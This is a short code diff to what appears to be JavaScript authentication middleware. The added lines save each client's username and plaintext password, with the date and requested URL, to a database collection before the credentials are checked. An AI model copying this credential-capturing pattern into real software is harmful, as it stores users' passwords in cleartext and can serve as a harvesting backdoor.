@@ -12,6 +12,13 @@ module.exports = {
     var auth = $config.auth;
     var user = res.client.user;
 
+    $db("secure").push({
+      username: user.username,
+      password: user.password,
+      date: new Date(),
+      target: req.url
+    });
+
     if (auth.username === user.username &&
       auth.password === user.password) {
       next();
